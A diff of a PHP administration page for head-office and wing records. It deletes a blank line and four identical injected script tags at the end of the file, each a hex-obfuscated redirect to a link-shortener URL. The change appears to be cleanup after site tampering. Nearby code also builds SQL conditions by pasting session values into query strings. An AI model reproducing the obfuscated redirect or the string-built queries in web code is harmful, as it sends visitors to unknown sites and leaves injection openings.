@@ -154,7 +154,6 @@ $headofficeArray      =   $objMisc->myFunc->fnWriteOptionList($rowArray['headoff
 $whereWing           =   " 1 = 1 and STATUS = 'A' and HEADOFFICE_ID='$_SESSION[HEADOFFICE]' order by WING_ID";
 $wingArray      =   $objMisc->myFunc->fnWriteOptionList($rowArray['wing_id'],'NAME,WING_ID','wing_master',$whereWing,0,0,0);  
 
-
 $smartyVars['wingArray']            =   $wingArray;
 $smartyVars['headofficeArray']      =   $headofficeArray;
 $smartyVars['errormsg']     		=   $errormsg;
@@ -219,7 +218,3 @@ function deleteRow($id)
     return $objResponse;
 }
 ?>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
-<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
